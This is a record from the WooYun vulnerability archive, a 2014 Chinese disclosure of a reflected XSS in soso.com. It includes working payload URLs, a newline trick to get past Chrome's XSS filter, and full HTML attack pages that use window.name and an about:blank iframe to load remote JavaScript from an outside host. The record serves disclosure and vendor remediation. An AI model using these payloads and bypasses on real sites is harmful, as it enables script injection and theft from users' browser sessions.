{"id": 54607, "wybug_id": "wooyun-2014-063890", "wybug_title": "soso主站反射型跨站(如何突破短的限制)", "wybug_corp": "搜狗", "wybug_author": "vanilla", "wybug_date": "2014-06-07 13:57", "wybug_open_date": "2014-07-23 22:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "技巧", "伪造"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： soso主站反射型跨站，其中遇到一个过chrome xssfilter的方法，也有突破短的限制，refferer伪造等猥琐的方法，执行任意js。算是一次艰难的弹框之旅吧，所以发上来大家讨论下 详细说明：  在对soso进行测试的时候发现\nhttp://www.soso.com/q?utf-8=ie&pid=s.idx&cid=s.idx.se&unc=&query=</script>&sut=484&sst0=1402016862602&lkt=3%2C1402016862118%2C1402016862461\n发现控制台报错了，心中窃喜查看源代码，果然存在问题：\n\n下面就是怎么过浏览器xss filter的问题：\nhttp://www.soso.com/q?utf-8=ie&pid=s.idx&cid=s.idx.se&unc=&query=%3C/script%3E%3Cimg/src=x%20onerror=alert(1)//&w=xxxxx&sut=484&sst0=1402016862602&lkt=3%2C1402016862118%2C1402016862461\n无疑会被chrome的xss filter拦截,但是当我在onerror后面加一个%0a后就不拦截了，变成了\nhttp://www.soso.com/q?utf-8=ie&pid=s.idx&cid=s.idx.se&unc=&query=%3C/script%3E%3Cimg/src=x%20onerror%0a=alert(1)//&w=xxxxx&sut=484&sst0=1402016862602&lkt=3%2C1402016862118%2C1402016862461\n成功alert\n\n正当我窃喜之际，新的问题又出现，竟然有长度限制，我要的效果是远程加载任意js，一个弹框当然不能满足我不过绕过限制也很简单，可以利用window.name可以跨域的特性，我们可以构造如下代码\n<html><body><script> window.name=\"with(document)body.appendChild(createElement('script')).src='//jtask.sinaapp.com/t.js'\";location.href=\"http://www.soso.com/q?utf-8=ie&pid=s.idx&cid=s.idx.se&unc=&query=%3C/script%3E%3Csvg/onload%0c=eval(name)//x&sut=484&sst0=1402016862602&lkt=3%2C1402016862118%2C1402016862461\";},500);</script></body></html>\n保存为test.html，满怀欣喜的去访问\nhttp://jtask.sinaapp.com/test.html\n结果却没有任何反应，百思不得其解，难道是修复了？然后我把链接复制到地址栏重新打开却是可以的？突然我灵光一闪，难道是？验证了refferer果然那我们要如何构造一个空的refferer呢？也就是伪造refferer直接上代码：\n<html><body><script>window.name=\"with(document)body.appendChild(createElement('script')).src='//jtask.sinaapp.com/t.js'\";//设置跨站代码</script><iframe id=\"my1\" name=\"with(document)body.appendChild(createElement('script')).src='//jtask.sinaapp.com/t.js'\" src=\"about:blank\"><!--关键位置refferer为空--></iframe><script>  var mf=document.getElementById(\"my1\");  mf.contentWindow.document.write('<script>top.location.href=\"http://www.soso.com/q?utf-8=ie&pid=s.idx&cid=s.idx.se&unc=&query=%3C/script%3E%3Csvg/onload%0c=eval(name)//x&sut=484&sst0=1402016862602&lkt=3%2C1402016862118%2C1402016862461\"</sc'+'ript>');</script></body></html>\n解释：利用about:blank协议构造空的refferer,用window.name跨域传输跨站代码，突破短的限制。让后用top.location.href跳转回soso的链接。顺利加载远程js\n\n但是这个代码只能在chrome上运行，在firefox上并不能运行，原因是在firefox上不能伪造refferer。总结：1、利用</script>跳出script2、利用%0a过chrome xss filter3、利用window.name突破短的限制4、利用iframe伪造refferer最后顺利执行跨站代码关于firefox的伪造refferer以后再深入研究。   漏洞证明：  在chrome下访问：\nhttp://jtask.sinaapp.com/test.html\n或者访问，弹框\nhttp://www.soso.com/q?utf-8=ie&pid=s.idx&cid=s.idx.se&unc=&query=%3C/script%3E%3Cimg/src=x%20onerror%0a=alert(1)//&w=xxxxx&sut=484&sst0=1402016862602&lkt=3%2C1402016862118%2C1402016862461\n\n\n   修复方案：  过滤/   版权声明：转载请注明来源 vanilla@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2014-06-09 10:58 厂商回复： 收到，感谢支持，欢迎到SGSRC提交漏洞！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}